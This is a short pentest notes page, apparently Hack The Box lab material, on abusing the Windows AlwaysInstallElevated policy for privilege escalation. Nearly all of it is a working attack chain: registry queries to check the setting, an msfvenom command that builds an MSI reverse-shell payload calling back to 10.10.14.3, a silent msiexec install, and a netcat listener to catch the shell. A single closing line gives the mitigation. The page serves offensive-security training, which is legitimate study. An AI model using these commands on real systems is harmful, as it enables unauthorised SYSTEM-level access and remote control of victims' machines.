# Always Install Elevated

### <mark style="color:red;">Always Install Elevated</mark>

This setting can be set via Local Group Policy by setting `Always install with elevated privileges` to `Enabled` under the following paths.

* `Computer Configuration\Administrative Templates\Windows Components\Windows Installer`
* `User Configuration\Administrative Templates\Windows Components\Windows Installer`

<figure><img src="../../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

<mark style="color:green;">**Enumerating Always Install Elevated Settings**</mark>

```powershell-session
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
```

```powershell-session
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

<mark style="color:green;">**Generating MSI Package**</mark>

{% code fullWidth="true" %}
```shell-session
msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
```
{% endcode %}

<mark style="color:green;">**Executing MSI Package**</mark>

```cmd-session
msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
```

<mark style="color:green;">**Catching Shell**</mark>

```shell-session
mrroboteLiot_1@htb[/htb]$ nc -lnvp 9443
```

This issue can be mitigated by disabling the two Local Group Policy settings mentioned above.
